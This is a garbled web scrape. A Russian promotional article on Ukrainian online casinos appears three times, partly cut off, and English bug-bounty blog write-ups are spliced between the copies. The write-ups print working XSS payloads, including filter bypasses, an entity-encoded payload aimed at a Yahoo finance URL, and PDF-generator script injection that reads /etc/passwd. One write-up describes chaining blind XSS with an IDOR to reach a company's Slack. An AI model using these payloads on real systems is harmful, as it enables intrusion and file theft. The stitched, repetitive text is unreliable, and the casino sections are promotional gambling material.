Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне!

Please forgive me for my noobness. So, I was testing a private program on HackerOne and tried to find some basic vulnerabilities. There was a functionality where I can write a Post and Publish it on the internet. So i was looking for Cross Site Scripting bug there but application was a bit strong enough ( not fully 😛 ) to protect it. The Editor looks like: I tried with basic paylods like “><svg/onload=confirm(1);> and all but failed. Then i noticed that application was removing all the payloads having “on” word like onerror , onload , basically event handlers. Then I tried script alert(1); and the output: I was like I quickly went through the post of my brother Armaan and the great Ak1t4 to get idea on how i could bypass this. Some of the payloads i used and the outputs I got are; <<script>alert(l); <>alert(l); <<scr<script>alert(1); alert(1); <<scr<script>ipt>alert(1); ipt>alert(1); <<scrip<script>t>alert(1); t>alert(1); I was like The last Attack <<scrip<scriptT>alert(1); and Boom ..!! I know i did some noobish way to get alert but I am noob and just want to tell to the community that “ There is always a way, you have to just try harder “.

Press enter or click to view image in full size and then tried to inject XSS payload “javascript:alert(1)” and it worked! https://REDACTED.com/files/file.htm#javascript :alert(1) I hope you guys like the writeup it’s pretty simple as you see regards, Abdelfattah.

My favorite target is Yahoo, because they have a big scope, so let’s start. In the hunting process, I detected some websites that are responsive in a mobile way. Not always the vulnerabilities that are detected in a website are reflected in the mobile version. I tried to find any bug on the website https://finance.yahoo.com, but I didn’t find anything :(, so, I decided to find bugs in the mobile version of this website. Press enter or click to view image in full size Mobile Version Finance Yahoo Until I found a very interesting endpoint https://finance.yahoo.com/quote/xxxxxxxxyyyyzzzzzz Press enter or click to view image in full size In this endpoint, everything I wrote using the URL was reflected in the website, although through this, I could have done a Content Spoffing, I didn’t do it since this has no impact for Yahoo and it is also out scope, so my other option was to test an XSS, which I did with the next payload https://finance.yahoo.com/quote/ \"><svg onload=alert(1)> Press enter or click to view image in full size For my luck in the source code I realized that the characters “>< were processed, then I could execute an XSS, however I did not understand at first, why XSS did not work, being that the attack vector was correct. Well, then I understood, that I had to close the </script> tag so that the XSS would work. and then… Press enter or click to view image in full size Not running :( Well, I started to study the behavior of this XSS, and I realized that the payload was processed in capital letters, and well, I noticed that a payload in capital letters does not work. I just needed the word “alert” to be processed in lowercase. Then I came up with an HTML character encoding. Lowercase Coding alert Coding &#97;&#108;&#101;&#114;&#116; New Payload XSS https://finance.yahoo.com/quote/ \"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)> Press enter or click to view image in full size : O: O: O and happiness came into my life :D.

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций.

Hello Hunters, This time I am writing about a Vulnerability found in another private program(xyz.com) on Bugcrowd which at first I thought wasn't much harmful(P4) but later escalated it to a P1. While browsing the Application I came across an endpoint which allowed us to download some kind of Payment Statements as PDF. The URL looked like this https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=xyz&date=2017-08-11&settlement_type=all&advice_id=undefined I saw that the Value of utr number is reflected inside the PDF file that got downloaded so I wrote some HTML in utrnumber parameter as \"><S>aaa https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = \"><S>aaa &date=2017-08-11&settlement_type=all&advice_id=undefined Upon opening this PDF I found that the HTML was rendered and could be seen in PDF. This kind of vulnerability usually leads to XSS but this time it was inside a PDF which was being generated dynamically. If you want to learn more about XSS then I advise to checkout this great intro on XSS: https://www.aptive.co.uk/blog/xss-cross-site-scripting/ I tried if I could use an iframe and load internal domains in the frame or if I could iframe file:///etc/passwd but none of the tricks worked! also, I wasn't able to iframe external domains. https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = \"><iframe src=\"http://localhost\"></iframe> &date=2017-08-11&settlement_type=all&advice_id=undefined But, from now I didn't know if I could go further because I wasn't sure if javascript could be executed like this in PDF.So after playing around a lot I found that we could execute javascript with the help of DOM Manipulation <p id=\"test\">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <p id=\"test\">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> &date=2017-08-11&settlement_type=all&advice_id=undefined and Upon downloading PDF I found that it contained the \"aaaa\" :D also sometime later, I found that I could also use document.write() function to show results more easily. <img src=x onerror=document.write('aaaa')> https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <img src=x onerror=document.write('aaaa')> &date=2017-08-11&settlement_type=all&advice_id=undefined after this I checked the window.location of where this javascript is executed and to my surprise it was executing in file:// origin on the Server https://xyz.com/payments/downloadStatements?Id=b9bc3d& utrnumber = <img src=x onerror=document.write('aaaa'%2bwindow.location)> &date=2017-08-11&settlement_type=all&advice_id=undefined Now since its executing on file://, I tried if we could access file:///etc/passwd via XHR(XMLHttpRequest), I wasn't sure myself. <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(\"GET\",\"file:///etc/passwd\"); x.send(); </script> https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber= <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/passwd\");x.send();</script> &date=2017-08-11&settlement_type=all&advice_id=undefined and then you know ;) so That was it, XSS in Server Side Generated PDFs to Local File Read! However, it took :P me some time to figure this You could see the number of PDFs I had to download: ./peace Rahul Maini Share Get link Facebook X Pinterest Email Other Apps Comments Unknown 8 November 2017 at 04:32 bhai kaise <3 Reply Delete Replies Reply Aryan Rupala 8 November 2017 at 08:40 Great Find!

Here’s the full content:\n\nHow I Pwned a company using IDOR & Blind XSS Skip to main content My Blog Search Search This Blog How I Pwned a company using IDOR & Blind XSS November 15, 2017 This post is about exploiting Blind XSS and IDOR to gain access to company's Slack, Facebook Workplace and other services used by the company. Special Thanks to Inti De Ceukelaire without his disclosure this would not have been possible. And also thanks to my friend Harsh Jaiswal for giving some ideas. Most of the people from infosec community must have read the disclosure by Inti De Ceukelaire regarding Ticket Trick , if you have not read I would suggest reading that first. ( https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c ) After reading the article, first thing came to my mind was exploiting this on a company as it had similar functionality on Support Tickets. The company's website had a Support Portal. We could create a Ticket by sending an email. Exploiting Ticket Trick to gain access to company's Slack or Facebook Workplace was not possible as Slack and Facebook included a random token while sending verification or forgot password emails. But there was a Blind XSS in company's internal domain from where they managed the tickets and an IDOR to View any user's ticket using both the vulnerabilities, I was able to access the company's Slack, Facebook Workplace. IDOR to View Any Support Ticket: There was a GET request in the Mobile application which allowed to view support tickets of any user by changing the Ticket ID. GET /api/param?param=XXXXXXXXXXXXXXXXXXXXX HTTP/1.1 Host: company.com Connection: close Accept: application/json, text/javascript X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 Accept-Language: en-IN,en-US;q=0.8 Cookie: x The Ticket ID, however, included 12-13 random numbers, so bruteforcing it would have taken a lot of time. So we still needed to find the Ticket ID. The IDOR was reported 1 month back was not fixed :P Blind XSS: We could create a support ticket by sending an email to support@company.com. The company then manages the Tickets from an internal domain. The input fields sent from the email was not sanitized on their internal domain. I created a ticket by sending an email with XSS payload. When the ticket was viewed by support staff XSS was triggered on their internal domain. I had used XSS Hunter to test this Blind XSS, XSS Hunter also captures the DOM of the entire page where the XSS is executed. The DOM contained all recently created Ticket IDs. The Blind XSS was also reported a month back and was marked as Not Applicable as the domain where XSS was executed was an internal domain and not mentioned in the scope. Chaining both the issues: I sent a password reset link to support@company.com at https://company.slack.com/forgot. This resulted in the creation of a ticket by no-reply-randomtoken@slack.com. Immediately after sending the password reset link to Slack, I sent an email to support@company.com with Blind XSS Payload. After some time the Blind XSS was executed, I received the DOM of the page. The DOM contained Ticket ID of the email sent from no-reply-randomtoken@slack.com. Using the IDOR, I was able to View the Ticket which surprisingly contained registration links of 8 Slack Channels of the Company. Similarly, Company's Facebook Workplace could have been accessed. This was also marked Not Applicable by the company but was rewarded with the company's minimum bounty amount.

Post a Comment Popular posts from this blog Exploiting a Single Request for Multiple Vulnerabilities September 19, 2017 Hello Everyone, This is my first blog post, it's about multiple security vulnerabilities found from a single request on a private program recently. The vulnerabilities found are simple Stored and Reflected XSS, SSRF and Command Injection. But since I have never written any pocs before, so just wanted to write about this one. So let's call the website as privatesite.com After login, the first thing I saw was a feature to upload images. So started testing the uploader functionality, like directly uploading PHP, SWF, SVG, etc., but nothing worked as the uploader looked secured from my end. Then I noticed there is a feature to crop the image, the post request of this feature looked kind of interesting. 1. SSRF There was a parameter http_path which had the image URL, so I fired up a socket listening to a port on my server, and in that http_path parameter I put my server's IP and port, and the socket received the connection. So an external SSRF was c...

Skip to main content Search Search This Blog Noob Ninja! - Infosec Writeups Share Get link Facebook X Pinterest Email Other Apps September 19, 2017 Story of a Parameter Specific XSS! REDIRECTING TO THE NEW BLOG ... Hello Infosec folks! So I am going to start writing posts related to my bug hunting findings and share it with the community starting with this post. So, this post is about a Reflected XSS I found in a Private Program which has been previously tested many times.This XSS was present on nearly every page of the domain (let's call this private-bounty.com) but wasn't found by anyone before. When I was going through the Application, I found an endpoint which had following in URL: https://www.private-bounty.com/Deactivate?view= aaa &utm_content= foo &utm_medium= bar &utm_source= baz I checked the source code to see if the parameter \"view\" was reflected somewhere in the page and it was found that the whole URL was reflected in Javascript context(inside Script tags) but except for the parameter \"view\" and its value. It got reflected as - https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar &utm_source= baz Then I tried to break out since foo, bar and baz values were also reflected in the page that but unfortunately, everything was properly encoded, https://www.private-bounty.com/Deactivate?utm_content= foo '\"><>\\ &utm_medium= bar '\"><>\\ &utm_source= baz '\"><>\\ Then I tried to add quotes in the path itself but it was also encoded well, so I moved ahead to find something else after not being able to XSS this due to the proper encoding of user input. https://www.private-bounty.com/Deactivate/ '\" ?utm_content=foo'\"><>\\&utm_medium=bar'\"><>\\&utm_source=baz'\"><>\\ I found this pattern of \"utm_content= foo &utm_medium= bar &utm_source= baz \" on every endpoint getting reflected and no other parameter will be reflected. I tried to append a custom parameter myself to see if it gets reflected, but it didn't work https://www.private-bounty.com/Deactivate?view= aaa &utm_content= foo &utm_medium= bar &utm_source= baz &test=xxxxx After that, I tried to append a parameter named utm_foobarbaz=xxxxx https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar &utm_source= baz & utm_foobarbaz=xxxxx and it was reflected! into the page, so the application only reflected the parameters beginning with \"utm\" so I tried again to break the context to achieve XSS using this parameter's value but it was also encoded well :( Then the last try I did was to break the context by putting the payload in the parameter name itself https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar &utm_source= baz&utm_foobarbaz'\"</>=xxxxx and boom! it worked :D, the parameter names beginning with \"utm\" were not being encoded when reflected in the page. and That's how we alert :p , https://www.private-bounty.com/Deactivate?utm_content=foo&utm_medium=bar&utm_source=baz& utm_foobarbaz');alert(1)// The lesson is that we should also always try to inject/fuzz the parameter names themselves and this was just a special case of such an XSS in parameter name beginning with a specific keyword \"utm\". - Rahul Maini Share Get link Facebook X Pinterest Email Other Apps Comments a 19 September 2017 at 07:37 Awesome :) Reply Delete Replies Reply jack sparrow 19 September 2017 at 08:40 :O awesone :) Reply Delete Replies Reply Mahender Singh 19 September 2017 at 11:52 Good Reply Delete Replies Reply aaaaaaaaaaaaaaaaaa 20 September 2017 at 08:15 awesome work! :P Reply Delete Replies Reply Unknown 21 September 2017 at 07:57 Good one mate (y) Reply Delete Replies Reply Unknown 22 September 2017 at 11:40 Gazzab Reply Delete Replies Reply Unknown 26 September 2017 at 02:02 keep it up !!!

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры.

Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых 